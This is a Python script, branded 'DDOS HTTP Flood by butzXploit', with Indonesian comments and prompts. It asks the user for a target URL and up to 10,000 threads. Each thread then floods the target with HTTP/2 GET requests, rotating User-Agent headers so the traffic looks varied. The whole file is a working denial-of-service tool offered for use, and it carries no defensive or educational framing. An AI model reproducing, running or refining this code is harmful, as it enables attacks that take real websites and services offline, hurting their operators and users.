import httpx
import threading
import time
import random
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

console = Console()

# User-Agent random untuk membuat request lebih bervariasi
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Linux; Android 10)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    # tambah user-agent lain jika mau
]

def attack(target_url, stop_event):
    with httpx.Client(http2=True, timeout=5) as client:
        while not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                }
                r = client.get(target_url, headers=headers)
                console.log(f"[green]Request sent! Status: {r.status_code}[/green]")
            except Exception as e:
                console.log(f"[red]Request failed: {e}[/red]")
            time.sleep(0.01)  # delay kecil supaya tidak overload client sendiri

def main():
    console.print(Panel("[bold red]DDOS HTTP Flood by butzXploit[/bold red]", title="🔥 BUTZXPLOIT 🔥"))
    target = console.input("[yellow]Masukkan URL target (contoh: https://example.com): [/yellow]")
    thread_count = console.input("[yellow]Jumlah thread (contoh: 100): [/yellow]")
    try:
        thread_count = int(thread_count)
        if thread_count < 1 or thread_count > 10000:
            console.print("[red]Thread harus antara 1-10000![/red]")
            return
    except:
        console.print("[red]Input thread tidak valid![/red]")
        return

    console.print(f"[cyan]Menyerang {target} dengan {thread_count} threads...[/cyan]")
    stop_event = threading.Event()
    threads = []

    for _ in range(thread_count):
        t = threading.Thread(target=attack, args=(target, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(0.2)
    except KeyboardInterrupt:
        console.print("\n[red]Menghentikan serangan...[/red]")
        stop_event.set()
        for t in threads:
            t.join()
        console.print("[green]Serangan dihentikan. Terima kasih sudah menggunakan tools ini![/green]")

if __name__ == "__main__":
    main()
